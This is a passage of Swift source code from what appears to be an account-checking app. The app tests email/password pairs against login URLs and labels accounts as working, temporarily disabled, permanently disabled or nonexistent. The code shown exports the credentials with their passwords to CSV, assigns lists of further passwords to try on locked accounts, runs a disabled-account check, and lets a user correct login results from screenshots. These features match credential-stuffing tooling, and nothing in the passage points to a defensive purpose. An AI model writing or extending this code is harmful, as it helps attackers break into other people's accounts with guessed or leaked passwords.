        case .permDisabled: creds = permDisabledCredentials
        case .noAcc: creds = noAccCredentials
        case .unsure: creds = unsureCredentials
        }
        var csv = "Email,Password,Status,Tests,Success Rate\n"
        for cred in creds {
            csv += "\(cred.username),\(cred.password),\(cred.status.rawValue),\(cred.totalTests),\(String(format: "%.0f%%", cred.successRate * 100))\n"
        }
        return csv
    }

    nonisolated enum CredentialExportFilter: String, CaseIterable, Sendable {
        case all = "All"
        case untested = "Untested"
        case working = "Working"
        case tempDisabled = "Temp Disabled"
        case permDisabled = "Perm Disabled"
        case noAcc = "No Acc"
        case unsure = "Unsure"

        var id: String { rawValue }
    }

    func clearDebugScreenshots() {
        let count = debugScreenshots.count
        debugScreenshots.removeAll()
        log("Cleared \(count) debug screenshots")
    }

    func runTempDisabledPasswordCheck() {
        tempDisabledService.runPasswordCheck(
            credentials: credentials,
            getURL: { [weak self] in self?.getNextTestURL() ?? URL(string: "https://example.com")! },
            persistCredentials: { [weak self] in self?.persistCredentials() },
            onLog: { [weak self] message, level in self?.log(message, level: level) }
        )
    }

    func assignPasswordsToTempDisabled(_ cred: LoginCredential, passwords: [String]) {
        cred.assignedPasswords = passwords
        cred.nextPasswordIndex = 0
        log("Assigned \(passwords.count) passwords to \(cred.username)")
        persistCredentials()
    }

    func runDisabledCheck(emails: [String]) {
        disabledCheckService.runCheck(emails: emails) { [weak self] results in
            guard let self else { return }
            let disabled = results.filter(\.isDisabled)
            if !disabled.isEmpty {
                self.log("Disabled check complete: \(disabled.count) perm disabled found", level: .warning)
            } else {
                self.log("Disabled check complete: no disabled accounts found", level: .success)
            }
        }
    }

    func applyDisabledCheckResults() {
        let disabledEmails = Set(disabledCheckService.disabledResults.map(\.email))
        var updated = 0
        for cred in credentials {
            if disabledEmails.contains(cred.username.lowercased()) && cred.status != .permDisabled {
                cred.status = .permDisabled
                updated += 1
            }
        }
        if updated > 0 {
            log("Updated \(updated) credentials to perm disabled from check results", level: .warning)
            persistCredentials()
        }
    }

    func addDisabledToBlacklist() {
        let emails = disabledCheckService.disabledResults.map(\.email)
        blacklistService.addMultipleToBlacklist(emails, reason: "Disabled check")
        log("Added \(emails.count) disabled accounts to blacklist", level: .success)
    }

    func correctResult(for screenshot: PPSRDebugScreenshot, override: UserResultOverride) {
        screenshot.userOverride = override

        guard let cred = credentials.first(where: { $0.id == screenshot.cardId }) else {
            log("Correction: could not find credential \(screenshot.cardDisplayNumber)", level: .warning)
            return
        }

        let isPass = override == .markedPass
        if isPass {
            cred.status = .working
            if let lastResult = cred.testResults.first, !lastResult.success {
                let corrected = LoginTestResult(success: true, duration: lastResult.duration, errorMessage: nil, responseDetail: "User corrected to PASS", timestamp: lastResult.timestamp)
                cred.testResults.insert(corrected, at: 0)
            }
        } else {
            cred.status = .noAcc
            if let lastResult = cred.testResults.first, lastResult.success {
                let corrected = LoginTestResult(success: false, duration: lastResult.duration, errorMessage: "User corrected to FAIL", responseDetail: nil, timestamp: lastResult.timestamp)
                cred.testResults.insert(corrected, at: 0)
            }
        }

        let label = isPass ? "PASS" : "FAIL"
        log("Debug correction: \(cred.username) marked as \(label) by user", level: isPass ? .success : .error)
        persistCredentials()
    }

    func resetScreenshotOverride(_ screenshot: PPSRDebugScreenshot) {
        screenshot.userOverride = .none
        log("Reset override for screenshot at \(screenshot.formattedTime)")
    }

    func requeueCredentialFromScreenshot(_ screenshot: PPSRDebugScreenshot) {
        guard let cred = credentials.first(where: { $0.id == screenshot.cardId }) else {
            log("Requeue: could not find credential \(screenshot.cardDisplayNumber)", level: .warning)
            return
        }
        cred.status = .untested
        log("Requeued \(cred.username) for retesting", level: .info)
        persistCredentials()
    }

    func screenshotsForCredential(_ credId: String) -> [PPSRDebugScreenshot] {
        debugScreenshots.filter { $0.cardId == credId }
    }

    func screenshotsForAttempt(_ attempt: LoginAttempt) -> [PPSRDebugScreenshot] {
        let ids = Set(attempt.screenshotIds)
        return debugScreenshots.filter { ids.contains($0.id) }
    }

    private func requeueCredentialToBottom(_ credential: LoginCredential) {
        if let idx = credentials.firstIndex(where: { $0.id == credential.id }) {
            credentials.remove(at: idx)
            credentials.append(credential)
        }
    }

    private var pendingLogs: [PPSRLogEntry] = []
    private var logFlushTask: Task<Void, Never>?

    func log(_ message: String, level: PPSRLogEntry.Level = .info) {
        pendingLogs.append(PPSRLogEntry(message: message, level: level))
        if level == .error || pendingLogs.count >= 10 {
            flushLogs()
        } else {
            scheduleLogFlush()
        }
        let debugLevel: DebugLogLevel
        switch level {
        case .info: debugLevel = .info
        case .success: debugLevel = .success
        case .warning: debugLevel = .warning
        case .error: debugLevel = .error
        }
        logger.log(message, category: .login, level: debugLevel)
    }

    private func scheduleLogFlush() {
        guard logFlushTask == nil else { return }
        logFlushTask = Task { [weak self] in
            try? await Task.sleep(for: .milliseconds(150))
            self?.flushLogs()
        }
    }

    private func flushLogs() {
        logFlushTask?.cancel()
        logFlushTask = nil
        guard !pendingLogs.isEmpty else { return }
        let batch = pendingLogs
        pendingLogs.removeAll()
        globalLogs.insert(contentsOf: batch.reversed(), at: 0)
        if globalLogs.count > 2000 {
            globalLogs.removeLast(globalLogs.count - 2000)
        }
    }
}
